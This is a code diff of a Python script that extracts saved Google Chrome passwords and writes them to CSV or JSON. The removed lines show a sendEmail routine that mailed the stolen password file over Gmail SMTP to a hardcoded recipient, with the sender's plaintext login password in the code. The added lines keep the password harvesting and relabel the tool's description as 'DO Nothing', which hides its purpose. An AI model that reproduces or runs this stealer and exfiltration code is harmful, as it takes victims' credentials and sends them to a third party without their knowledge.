@@ -7,25 +7,21 @@ import csv
 import json
 import argparse
 
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-
 try:
     import win32crypt
 except:
     pass
 
 
+
 def args_parser():
+
     parser = argparse.ArgumentParser(
-        description="Retrieve Google Chrome Passwords")
+        description="DO Nothing")
     parser.add_argument("-o", "--output", choices=['csv', 'json'],
-                        help="Output passwords to [ CSV | JSON ] format.")
+                        help="Output  to [ CSV | JSON ] format.")
     parser.add_argument(
-        "-d", "--dump", help="Dump passwords to stdout. ", action="store_true")
+        "-d", "--dump", help="Dump  to stdout. ", action="store_true")
 
     args = parser.parse_args()
     if args.dump:
@@ -98,7 +94,7 @@ def getpath():
     if os.name == "nt":
         # This is the Windows Path
         PathName = os.getenv('localappdata') + \
-                   '\\Google\\Chrome\\User Data\\Default\\'
+            '\\Google\\Chrome\\User Data\\Default\\'
         if (os.path.isdir(PathName) == False):
             print('[!] Chrome Doesn\'t exists')
             sys.exit(0)
@@ -121,85 +117,24 @@ def getpath():
 
 def output_csv(info):
     try:
-        with open('chromepass-passwords.csv', 'wb') as csv_file:
-            csv_file.write('origin_url,username,password \n'.encode('utf-8'))
+        with open('C:\CIMIC\chromepass.csv', 'wb') as csv_file:
+            csv_file.write('origin_url,username,p \n'.encode('utf-8'))
             for data in info:
                 csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data[
                     'username'], data['password'])).encode('utf-8'))
-        print("Data written to chromepass-passwords.csv")
-        sendEmail()
+        print("Data written to chromepass.csv")
     except EnvironmentError:
         print('EnvironmentError: cannot write data')
 
 
 def output_json(info):
-    try:
-        with open('chromepass-passwords.json', 'w') as json_file:
-            json.dump({'password_items': info}, json_file)
-            print("Data written to chromepass-passwords.json")
-    except EnvironmentError:
-        print('EnvironmentError: cannot write data')
+	try:
+		with open('chromepass.json', 'w') as json_file:
+			json.dump({'pass':info},json_file)
+			print("Data written to chromepass.json")
+	except EnvironmentError:
+		print('EnvironmentError: cannot write data')
 
-
-def sendEmail():
-    fromaddr = "pathakrohit8190@gmail.com"
-    toaddr = "pathakrohit08@gmail.com"
-
-    # instance of MIMEMultipart
-    msg = MIMEMultipart()
-
-    # storing the senders email address
-    msg['From'] = fromaddr
-
-    # storing the receivers email address
-    msg['To'] = toaddr
-
-    # storing the subject
-    msg['Subject'] = "Password sent by User"
-
-    # string to store the body of the mail
-    body = "Body_of_the_mail"
-
-    # attach the body with the msg instance
-    msg.attach(MIMEText(body, 'plain'))
-
-    # open the file to be sent
-    filename = "chromepass-passwords.csv"
-    attachment = open(".\chromepass-passwords.csv", "rb")
-
-    # instance of MIMEBase and named as p
-    p = MIMEBase('application', 'octet-stream')
-
-    # To change the payload into encoded form
-    p.set_payload((attachment).read())
-
-    # encode into base64
-    encoders.encode_base64(p)
-
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
-    # attach the instance 'p' to instance 'msg'
-    msg.attach(p)
-
-    # creates SMTP session
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-
-    # start TLS for security
-    s.starttls()
-
-    # Authentication
-    s.login(fromaddr, "rohit8190")
-
-    # Converts the Multipart msg into a string
-    text = msg.as_string()
-
-    # sending the mail
-    s.sendmail(fromaddr, toaddr, text)
-
-    # terminating the session
-    s.quit()
-
-    print("Email sent")
 
 
 if __name__ == '__main__':
